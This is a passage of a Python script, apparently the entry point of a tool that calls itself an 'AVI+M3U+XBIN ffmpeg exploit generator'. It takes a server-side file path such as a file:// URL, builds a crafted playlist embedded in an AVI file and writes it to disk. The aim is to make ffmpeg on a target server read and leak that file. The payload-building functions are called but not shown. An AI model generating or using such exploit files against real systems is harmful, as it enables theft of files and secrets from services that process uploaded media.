if __name__ == "__main__":
    parser = argparse.ArgumentParser('AVI+M3U+XBIN ffmpeg exploit generator')
    parser.add_argument(
        'filename',
        help='filename to be read from the server (prefix it with "file://")')
    parser.add_argument('output_avi', help='where to save the avi')
    args = parser.parse_args()
    assert '://' in args.filename, "ffmpeg needs explicit proto (forgot file://?)"
    content = gen_xbin_playlist(args.filename)
    avi = make_playlist_avi(content)
    output_name = args.output_avi

    with open(output_name, 'wb') as f:
        f.write(avi)